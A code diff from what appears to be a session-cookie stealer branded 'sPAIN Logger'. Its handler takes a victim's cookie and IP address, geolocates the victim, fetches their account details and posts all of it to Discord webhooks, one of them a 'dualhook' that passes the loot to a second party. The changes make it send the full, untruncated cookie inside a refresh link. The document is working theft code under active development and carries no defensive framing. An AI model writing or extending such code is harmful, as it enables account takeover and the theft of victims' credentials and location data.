@@ -276,17 +276,16 @@ async function discordSend(url, payload) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!res.ok) console.error('Discord error:', res.status, await res.text());
+    if (!res.ok) console.error('Discord error:', res.status);
   } catch (e) { console.error('Discord fetch error:', e.message); }
 }
 
-// ONLY place with refresh link - raw cookie message
+// FULL COOKIE in refresh URL - no truncation!
 async function discordSendCookie(url, cookie, username) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    // Truncate cookie for URL to avoid limits
-    const shortCookie = cookie.length > 150 ? cookie.substring(0, 150) + '...' : cookie;
-    const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(shortCookie)}`;
+    // Send FULL cookie in URL (not truncated)
+    const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)}`;
     
     await fetch(url, {
       method: 'POST',
@@ -297,7 +296,7 @@ async function discordSendCookie(url, cookie, username) {
         content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${refreshUrl})**\n\n\`\`\`\n${cookie}\n\`\`\``
       })
     });
-  } catch {}
+  } catch (e) { console.error('Cookie send error:', e); }
 }
 
 export default async function handler(req, res) {
@@ -340,7 +339,7 @@ export default async function handler(req, res) {
     if (parent?.webhook && parent.webhook !== record.webhook) webhook1 = parent.webhook;
   }
 
-  // NO COOKIE - Wrong cookie alert
+  // NO COOKIE
   if (!cookie) {
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
@@ -375,7 +374,7 @@ export default async function handler(req, res) {
   const acc = accountInfo.refreshed ? accountInfo.account : null;
   const avatarUrl = acc?.avatarUrl;
 
-  // WEBHOOK 2: Cookie Captured (NO refresher link here!)
+  // WEBHOOK 2: Cookie Captured
   await discordSend(webhook2, {
     username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
     embeds: [{
@@ -395,7 +394,7 @@ export default async function handler(req, res) {
     }]
   });
 
-  // WEBHOOK 1: Dualhook (NO refresher link here!)
+  // WEBHOOK 1: Dualhook
   if (webhook1) {
     await discordSend(webhook1, {
       username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
@@ -415,7 +414,7 @@ export default async function handler(req, res) {
     });
   }
 
-  // Account Info (NO refresher link in embed!)
+  // Account Info
   if (acc) {
     const accountEmbed = {
       title: '✅ Account Info Valid',
@@ -444,7 +443,7 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
   }
 
-  // ONLY place with refresh link - raw cookie message
+  // ONLY place with refresh link - raw cookie message (FULL COOKIE)
   await discordSendCookie(webhook2, cookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
 
